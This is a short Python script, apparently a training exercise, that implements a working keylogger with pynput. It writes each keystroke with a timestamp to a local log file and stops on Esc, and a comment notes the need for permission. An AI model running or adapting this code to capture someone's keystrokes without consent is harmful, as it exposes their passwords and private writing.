###Simple Keylogger
# Create a basic keylogger program that records and logs keystrokes. 
# Focus on logging the keys pressed and saving them to a file. 
# Note: Ethical considerations and permissions are crucial for projects involving keyloggers. 


from pynput import keyboard
import datetime

# Set the log file path
log_file = "C:\\amrutha -progidy\\keylog.txt"

def on_press(key):
    try:
        # Log the key press
        with open(log_file, "a") as f:
            f.write(f"{datetime.datetime.now()} - {key.char}\n")
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        with open(log_file, "a") as f:
            f.write(f"{datetime.datetime.now()} - {key}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the keylogger when the Esc key is pressed
        return False

# Create a keyboard listener
listener = keyboard.Listener(on_press=on_press, on_release=on_release)

# Start the keylogger
listener.start()
listener.join()